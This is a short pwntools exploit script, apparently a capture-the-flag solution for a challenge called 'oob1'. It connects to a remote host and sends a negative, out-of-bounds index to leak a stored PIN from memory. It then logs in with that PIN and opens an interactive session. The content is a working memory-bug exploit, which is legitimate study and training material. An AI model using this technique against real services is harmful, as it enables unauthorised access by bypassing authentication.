#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./oob1"
elf = ELF(pwn_file)
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 3111)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug:
    gdbcmd = '''
    c
    '''

    # gdb.attach(c, gdbcmd)
    context.log_level ='debug'


rbp = p64(0x12334)
#main = p64(0x04006f7)

def leak_pin():
    c.sendlineafter('ID:', str((0x06010a0 - 0x06010c0) // 8))
    c.sendlineafter('PIN: ', '1')
    c.recvuntil('[')
    return u32(c.recvn(4))


pin = leak_pin()

c.sendlineafter('ID:', '0')
c.sendlineafter('PIN: ', str(pin))





c.interactive()
c.close()
